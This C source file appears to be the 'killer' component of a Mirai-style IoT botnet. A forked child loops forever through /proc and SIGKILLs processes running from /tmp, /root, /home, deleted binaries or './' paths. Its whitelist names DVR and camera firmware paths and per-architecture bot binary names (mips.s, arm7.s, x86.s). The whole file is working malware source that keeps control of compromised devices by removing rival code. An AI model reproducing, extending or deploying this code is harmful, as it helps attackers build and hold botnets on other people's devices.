#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <stdbool.h>
#include <sys/prctl.h>

#include "headers/killer.h"

#define MAX_PATH_LENGTH 256

const char *whitelist[] = {
    "/usr/lib/systemd/systemd",
    "/usr/libexec/openssh/sftp-server",
    "/usr/bin",
    "/usr/sbin",
    "/usr/lib",
    "/var/lib",
    "/var/spool",
    "/var/Sofia",
    "sshd",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "encoder",
    "ZG9z",
    "var/Challenge",
    "app/hi3511",
    "gmDVR",
    "usr/dvr_main _8182T_1108",
    "mnt/mtd/app/gui",
    "var/Kylin",
    "anko-app/ankosample _8182T_1104",
    "var/tmp/sonia",
    "hicore",
    "stm_hi3511_dvr",
    "usr/",
    "shell",
    "mnt/",
    "sys/",
    "bin/",
    "boot/",
    "media/",
    "srv/",
    "var/run/",
    "sbin/",
    "lib/",
    "etc/",
    "dev/",
    "home/Davinci",
    "watchdog",
    "/var/spool",
    "/var/Sofia",
    "sshd",
    "bash",
    "httpd",
    "telnetd",
    "dropbear",
    "ropbear",
    "system",
    "/root/dvr_gui/",
    "/root/dvr_app/",
    "/anko-app/",
    "/opt/",
    "/usr/sbin/",
    "/usr/lib/",
    "mpsl.nn",
    "mips.s",
    "arm4.s",
    "arm5.s",
    "arm6.s",
    "arm7.s",
    "x86.s",
    "mil",
    "wlancont",
    "/var/tmp/wlancont"
};

const char *malwareDirs[] = {
    "/tmp",
    "/var/run",
    "/mnt",
    "/root",
    "/var/tmp",
    "/boot",
    "/.",
    "(deleted)",
    "/home"
};

bool is_directory(const char *path) {
    struct stat path_stat;
    if (stat(path, &path_stat) == -1)
        return false;

    return S_ISDIR(path_stat.st_mode);
}

bool is_whitelisted(const char *maps) {
    for (int i = 0; i < sizeof(whitelist) / sizeof(whitelist[0]); ++i) {
        if (strstr(maps, whitelist[i])) {
            return true;
        }
    }
    return false;
}

void kill_process(int pid) {
    kill(pid, SIGKILL);
}

void killer_maps() {
    DIR *dir;
    struct dirent *file;
    char mapsPath[MAX_PATH_LENGTH];
    char rdmaps[100];

    dir = opendir("/proc/");
    if (dir == NULL) {
        return;
    }

    while ((file = readdir(dir)) != NULL) {
        if (!isdigit(file->d_name[0]))
            continue;

        int pid = atoi(file->d_name);

        if (pid == getpid() || pid == getppid() || pid == 0)
            continue; // Skipping system processes, our own process, and non-pid directories.

        snprintf(mapsPath, MAX_PATH_LENGTH, "/proc/%d/maps", pid);

        int fd = open(mapsPath, O_RDONLY);
        if (fd == -1) {
            continue; // Ignore if failed to open file
        }

        ssize_t bytesRead = read(fd, rdmaps, sizeof(rdmaps) - 1);
        close(fd);

        if (bytesRead == -1)
            continue; // Ignore if failed to read file

        rdmaps[bytesRead] = '\0';

        if (is_whitelisted(rdmaps))
            continue;

        for (int i = 0; i < sizeof(malwareDirs) / sizeof(malwareDirs[0]); ++i) {
            if (strstr(rdmaps, malwareDirs[i])) {
                kill_process(pid);
              //  report_kill2(pid,rdmaps);
                break;
            }
        }
    }

    closedir(dir);
}
void killer_stat() {
    DIR *dir;
    struct dirent *file;
    char statPath[MAX_PATH_LENGTH];
    char exePath[MAX_PATH_LENGTH];
    char processPath[MAX_PATH_LENGTH];

    dir = opendir("/proc/");
    if (dir == NULL) {
        perror("Failed to open directory");
        return;
    }

    while ((file = readdir(dir)) != NULL) {
        if (!isdigit(file->d_name[0]))
            continue;

        int pid = atoi(file->d_name);

        snprintf(statPath, MAX_PATH_LENGTH, "/proc/%d/stat", pid);
        snprintf(exePath, MAX_PATH_LENGTH, "/proc/%d/exe", pid);

        // Read the process path from the stat file
        FILE *fp = fopen(statPath, "r");
        if (fp == NULL) {
            continue; // Ignore if failed to open file
        }

        fscanf(fp, "%*d %*s %*c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u %*u %*u %*d %*d %*d %*d %*d %*u %*u %*d %[^\n]", processPath);

        fclose(fp);

        if (is_whitelisted(processPath))
            continue;

        // Resolve symbolic links to get the actual executable path
        ssize_t exePathLen = readlink(exePath, processPath, MAX_PATH_LENGTH - 1);
        if (exePathLen != -1) {
            processPath[exePathLen] = '\0';

            for (int i = 0; i < sizeof(malwareDirs) / sizeof(malwareDirs[0]); ++i) {
                if (strstr(processPath, malwareDirs[i])) {
                    kill_process(pid);
                    break;
                }
            }
        }
    }

    closedir(dir);
}

void cmd_kill() {
    DIR *dir = opendir("/proc");
    if (!dir) {
        return;
    }

    struct dirent *file;
    char rdbin[128];
    char rdpath[256];

    pid_t self_pid = getpid(); // Store the current process's PID

    size_t whitelist_size = sizeof(whitelist) / sizeof(whitelist[0]);

    while ((file = readdir(dir))) {
        if (*file->d_name < '0' || *file->d_name > '9') {
            continue;
        }

        pid_t pid = atoi(file->d_name);
        if (pid == self_pid) {
            continue; // Skip the current process's PID
        }

        snprintf(rdpath, sizeof(rdpath), "/proc/%s/cmdline", file->d_name);

        int fd = open(rdpath, O_RDONLY);
        if (fd == -1) {
            closedir(dir);
            return;
        }

        ssize_t num_read = read(fd, rdbin, sizeof(rdbin) - 1);
        close(fd);

        if (num_read > 0) {
            rdbin[num_read] = '\0';

            // Check if the process is in the whitelist
            int whitelisted = 0;
            for (size_t i = 0; i < whitelist_size; i++) {
                if (strstr(rdbin, whitelist[i])) {
                    whitelisted = 1;
                    break;
                }
            }

            if (!whitelisted && strstr(rdbin, "./")) {
                if (kill(pid, SIGKILL) == 0) {
#ifdef DEBUG
                    printf("[cmd] killed pid: %d - %s\n", pid, rdbin);
#endif
              //  report_kill2(pid, rdbin);
                } else {
                    closedir(dir);
                    return;
                }
            }
        }
    }

    closedir(dir);
}

void killer_boot() {
    pid_t childpid = fork();
    if (childpid == -1) {
        return 1;
    } else if (childpid > 0) {
        // Parent process
        return 0;
    }

    // Child process
    prctl(PR_SET_PDEATHSIG, SIGHUP); // Kill the child process if the parent dies

    while (1) {
        killer_maps();
      //  killer_stat();
        cmd_kill();
        usleep(200000);
    }
}